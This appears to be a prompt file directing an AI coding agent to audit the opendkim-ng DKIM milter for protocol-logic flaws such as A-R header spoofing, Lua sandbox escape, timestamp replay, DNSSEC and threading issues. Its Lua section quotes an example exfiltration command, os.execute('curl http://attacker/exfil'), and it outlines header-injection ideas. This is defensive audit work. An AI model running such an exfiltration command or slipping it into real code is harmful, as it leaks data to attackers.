# Security Audit Prompt B — Protocol Logic & Runtime Security

## Task

Perform a thorough logic and protocol security audit of the opendkim-ng codebase.
This is complementary to the C memory-safety audit (Prompt A) — focus here on
**what the code does**, not on buffer arithmetic.

This is an **internet-facing milter daemon** sitting in the mail flow of a
production server.  An attacker can send crafted email designed to:
- make a DKIM-failing message appear to pass
- inject fake `Authentication-Results:` headers that survive stripping
- manipulate which signing key is selected for outbound mail
- escape from a Lua policy script sandbox

Do not modify any source files.  Produce only findings, as described below.

---

## Token budget and resume instructions

**This audit is long.** If you approach your output token limit mid-audit:

1. Stop cleanly at the **end of the current section** — do not write a partial
   section.
2. Write all findings completed so far in the output format below.
3. End with an **Audit State block** (format specified at the bottom of this
   prompt) listing which sections are done, which are pending, and any
   cross-file threads you were tracking that have not yet been resolved.
4. Do not summarise or abbreviate findings already written — write them in full.

The findings document and Audit State block together must be sufficient for a
**clean resume in a new session on a different machine**, with no access to
this session's context.  To resume: start a new Claude Code session, paste
this prompt, paste the findings so far, paste the Audit State block, and
instruct Claude to continue from the next pending section without
re-examining anything already marked SAFE, FIXED, or VULNERABLE.

---

## Read and reasoning discipline

**Read discipline**: Read each file completely top-to-bottom before writing
any findings. Do not grep for section targets before reading the full file.
Build a mental model of data flow first.

**What to look for**: Logic errors and protocol violations, not buffer
arithmetic. Focus on what the code *decides*, not how memory is managed.

**Cross-path discipline**: For every validation check found, explicitly ask:
does this exist in BOTH the inbound verification path AND the outbound signing
path? Asymmetric validation (present in one, absent in the other) is a
finding. Do not assume symmetry.

**Absence findings**: A missing check is as reportable as a present bug.
If a timestamp comparison, character-set filter, or DNSSEC rejection is
expected by the protocol but absent in the code, report it even if no
explicit TODO comment marks it.

**Threading**: When reading shared-state access, note whether conf_lock is
held. Absence of a lock around a curconf read is evidence, not an assumption.

**Lua sandboxing**: Enumerate what is present, not just what is missing.
List every library opened, then flag the dangerous ones.

**Status discipline**: Every section must conclude with one of:
VULNERABLE / FIXED / UNCERTAIN / SAFE — with the specific file:line that
determines the verdict.

**File reading order is mandatory**: Read files in the sequence listed.
Do not skip ahead to a target function before reading earlier files in
the list — call relationships only make sense in the order caller → callee.

**Do not re-examine**: Anything already marked SAFE, FIXED, or VULNERABLE in
a findings document passed to you at resume time is settled. Do not re-read
those sections or re-derive those verdicts.

---

## What is already known / fixed

Do not re-report these:

- CVE-2022-48521: A-R header ordinal-numbering bypass — fixed (reverse traversal)
- `dkimf_config_free()` assert-abort under reload/close race — replaced with guard
- Division by zero (`Minimum 100%`) with empty body — fixed
- `dkim_mail_parse_multi()` quote-handling edge cases — fixed
- `DKIM_SIGFLAG_IGNORE` reported as `dkim=fail` instead of `dkim=policy` — fixed
- `mctx_domain == NULL` pointer-vs-array bug — fixed
- `RequiredHeaders` not rejecting on violation — fixed
- Body-skip when only one canonicalisation mode finished — fixed
- `ub_ctx_config()` mutex race — fixed
- `dkimf_securefile` critical-section widened — fixed

---

## Files to read

Read these files completely, in order, before writing findings.

1. `libopendkim/dkim.c` — the core library
2. `opendkim/opendkim.c` — the milter daemon (focus: `mlfi_eoh`, `mlfi_eom`,
   `dkimf_config_load`, `dkimf_add_signrequest`)
3. `opendkim/opendkim-lua.c` — Lua hook integration
4. `opendkim/opendkim-ar.c` — Authentication-Results parsing and generation
5. `libopendkim/dkim-keys.c` — key retrieval from DNS

---

## Specific questions to answer

Work through each section below.  For each, state whether a vulnerability exists,
is absent, or is uncertain, with evidence.

---

### Section 1 — CVE-2020-12272 (d= tag character-set validation)

The Debian security team issued a patch for upstream OpenDKIM that adds a
character-set loop rejecting any byte outside `[A-Za-z0-9._-]` from the `d=`
tag value in the inbound verification path.  Upstream never merged this patch.

**Task**:
- Read `libopendkim/dkim.c` around `dkim_process_set()` and `dkim_sig_domainok()`.
- Read the signing path (`dkim_sign()`) around where `sig->sig_domain` is set and
  checked (commit `7d77eb31` added "reject non-printable domain/selector in
  dkim_sign()").
- Determine: does the `[A-Za-z0-9._-]` (or equivalent) character-set validation
  exist in the **inbound verification** path, or only in the **outbound signing**
  path?  Quote the relevant code.
- If the validation is present in both paths: mark FIXED, with line numbers.
- If the validation is present in signing only but not verification: mark as
  HIGH — a crafted `DKIM-Signature: d=evil\nX-Injected: header` could inject
  headers into a forged Authentication-Results value.
- If the validation is absent entirely: mark CRITICAL.

---

### Section 2 — Authentication-Results header injection and stripping

The A-R stripping logic is security-critical: if a fake A-R header from an
external sender survives into the recipient's inbox it can spoof
`dkim=pass` to downstream filters and users.

**Task**:
- Read `mlfi_eoh()` in `opendkim/opendkim.c` (the header-phase callback).
- Find the loop that identifies and removes inbound A-R headers.
- Verify that the CVE-2022-48521 fix (reverse-order traversal with stable
  ordinal tracking) actually closes the bypass: could an attacker send exactly
  N A-R headers such that after removing N-1 of them in reverse order, one
  fake header with an ordinal that was never assigned survives?
- Verify that the `ares_parse()` call in `opendkim-ar.c` used to detect
  "our own" A-R headers correctly matches the local hostname: what if the
  machine's hostname contains uppercase letters or a trailing dot?  Could a
  crafted `Authentication-Results: MYHOST.example.com; dkim=pass` survive
  stripping on a host named `myhost.example.com`?

---

### Section 3 — Lua policy hook sandboxing

`opendkim-lua.c` embeds Lua 5.4 for policy hooks (`setup`, `screen`, `eom`,
`final`).  Administrator-written Lua scripts are loaded and executed in the
milter's address space.

**Task**:
- Find the `lua_State` initialisation in `dkimf_lua_setup_hook()` and the
  equivalent function for screen/eom/final hooks.
- Identify which standard Lua libraries are opened (look for `luaL_openlibs`).
- List which dangerous libraries are available to hook scripts: `os` (shell
  execution), `io` (file access), `debug` (reflection/metatable bypass),
  `package` (loading external C modules).
- Determine whether scripts run in the milter worker thread, and what the
  consequence is of a script calling `os.execute("curl http://attacker/exfil")` —
  does it block the milter thread?  For how long?
- Determine whether there is any timeout or resource limit on Lua execution.
- Assess: if an attacker can influence the content of any Lua script file loaded
  at runtime (e.g. via a compromised config reload), what is the impact?
- Recommend: which standard libraries should be stripped (via `lua_pushnil` +
  `lua_setglobal`) before executing hook scripts, and how to add a per-hook
  execution time limit using `lua_sethook`.

---

### Section 4 — DKIM signature timestamp and replay

RFC 6376 §3.5 defines `t=` (signature timestamp) and `x=` (signature expiry).
The daemon checks `ClockDrift` (config key) to allow for clock skew.

**Task**:
- Read `libopendkim/dkim.c` around where `t=` and `x=` tags are processed and
  compared against the current time.
- Answer:
  1. Is a signature with `t=` far in the future rejected?  (Could an attacker
     pre-generate a signature valid years from now?)
  2. Is a signature with `x=` in the past rejected?  What is the exact comparison
     used and can clock skew (`conf_clockdrift`) allow an expired signature to pass?
  3. What happens if `x=` < `t=` (expiry before signing time)?  Is this rejected
     as a syntax error or silently accepted?
  4. What happens if `t=` or `x=` is not a valid decimal integer (e.g. contains
     letters or is empty)?

---

### Section 5 — Multi-signature and signature ordering

When multiple `DKIM-Signature:` headers are present, the daemon evaluates all of
them and reports the "best" result.  An attacker can add extra signatures designed
to shadow a legitimate passing signature with a crafted failing one, or vice versa.

**Task**:
- Read `mlfi_eom()` in `opendkim/opendkim.c` and the signature-result loop.
- Determine the selection logic: when one signature passes and another fails, which
  result is reported in `Authentication-Results:`?
- Specifically: can an attacker send an email with a valid `DKIM-Signature` (that
  would pass) and prepend an additional `DKIM-Signature` that is syntactically
  valid but uses a key they control, causing the daemon to report `dkim=fail`
  for the whole message?
- Check commit `533125b3` ("constrain header.b substring for duplicate signatures"):
  understand what the fix does, and determine whether the underlying duplicate-
  signature logic is otherwise sound.
- Check the `DKIM_SIGFLAG_IGNORE` path: under what conditions is a signature
  flagged for ignore, and is the `dkim=policy` result correctly reported in all
  code paths that exit `mlfi_eom()`?

---

### Section 6 — DNSSEC and DNS response integrity

The daemon can use libunbound for DNSSEC-validated DNS.  Without DNSSEC, a
network attacker can supply a forged TXT record (key data) to substitute a key
they control for the legitimate signing key.

**Task**:
- Read `dkim_get_key_dns()` in `libopendkim/dkim-keys.c` and the `sig_dnssec_key`
  field handling.
- Determine: when `DNSSECBogus` or `DNSSECInsecure` is returned by the resolver,
  does the daemon reject the signature or log-and-continue?
- Read the `RequireSafeKeys` / DNSSEC config option handling in
  `opendkim/opendkim.c` (`dkimf_config_load`).  Under the default configuration,
  what happens when DNSSEC validation fails for a signing-key lookup?
- If the system is built without `WITH_UNBOUND`, is there any fallback to DNSSEC
  via the system resolver's `res_query`?  Is the DNSSEC AD bit in the standard
  resolver response checked?

---

### Section 7 — Threading and shared-state races

The milter daemon is multi-threaded.  Each connection gets a worker thread.
Multiple threads share the active config (`curconf`), the database handles,
and the Lua state.

**Task**:
- Read the `conf_lock` usage in `opendkim/opendkim.c`.  Identify all places where
  `curconf` (the active config pointer) is read in a milter callback without
  holding `conf_lock`.  A racing `SIGUSR1` config reload could free the config
  while a callback holds a pointer to it.
- Check whether Lua states are shared across threads or per-connection.  If
  shared, `lua_State` is not thread-safe.
- Check the `dkimf_securefile()` TOCTOU: the function stats a file path, checks
  ownership/permissions, and returns.  The **caller** then opens the file.  Is
  there still a window between the final check and the open where the file can be
  replaced by an attacker with write access to the directory?

---

### Section 8 — Signing key confidentiality and privilege separation

Private keys are read from files during config load and stored in memory for
the lifetime of the process.

**Task**:
- Determine where private key material is stored in memory (`conf_keyfile`,
  `conf_keydata`, PEM parsing in `opendkim-crypto.c`).
- Is key material ever written to a log file or included in a syslog message
  (e.g., in an error path)?
- Is key material zeroed (`explicit_memset`, `memset_s`, or `OPENSSL_cleanse`)
  when the config is freed or reloaded?  Look in `dkimf_config_free()`.
- Does the daemon drop privileges (setuid/setgid) before reading private keys,
  or after?  If after, the keys are readable by the higher-privilege process
  during the window between startup and privilege drop.

---

## Output format

For each finding, write one entry:

```
### [SEVERITY] Section N — short title

**Status**: VULNERABLE / FIXED / UNCERTAIN / SAFE
**What**: one sentence.
**Evidence**: relevant file:line references and code excerpts (short).
**Impact**: what an attacker achieves.
**Recommendation**: the minimal fix or mitigation.
```

Severity: **CRITICAL**, **HIGH**, **MEDIUM**, **LOW**, **INFO**.

For **SAFE** or **FIXED** findings, write a brief confirmation with the
evidence (line numbers) so the next auditor does not re-examine them.

At the end, write a one-paragraph summary of the overall protocol-logic security
posture and the top two or three actionable recommendations.

Finally, write all findings out to a file named `AUDIT-FINDINGS-B-logic-security.md`
in the root of the repository.

---

## Audit State block (write this if stopping early)

If you stop before completing all eight sections, append the following block
after your findings.  It must be self-contained — a new session on a different
machine must be able to resume from it with no other context.

```
## AUDIT STATE — resume point

**Prompt**: AUDIT-PROMPT-B-logic-security.md
**Codebase snapshot**: [git commit hash or "unknown"]
**Sections completed**: [list, e.g. 1, 2, 3]
**Sections pending**: [list, e.g. 4, 5, 6, 7, 8]

**Verdicts so far** (one line each — do not re-examine these):
- Section 1: [VERDICT] — [one-line summary]
- Section 2: [VERDICT] — [one-line summary]
- ...

**Open threads** (cross-file questions not yet resolved):
- [describe any data-flow or call-chain question you were mid-way through]
- [e.g. "conf_lock audit in opendkim.c partially complete — mlfi_connect and
   mlfi_envfrom checked (unlocked reads of curconf confirmed), mlfi_eoh not
   yet checked"]

**Files read so far**: [list]
**Files not yet read**: [list]

**Resume instruction**: Start a new Claude Code session with `claude --model opus`.
Paste AUDIT-PROMPT-B-logic-security.md, then this Audit State block, then the
findings above. Instruct Claude to continue from Section [N], reading only the
files not yet read, and not to re-examine any verdict listed above.
```
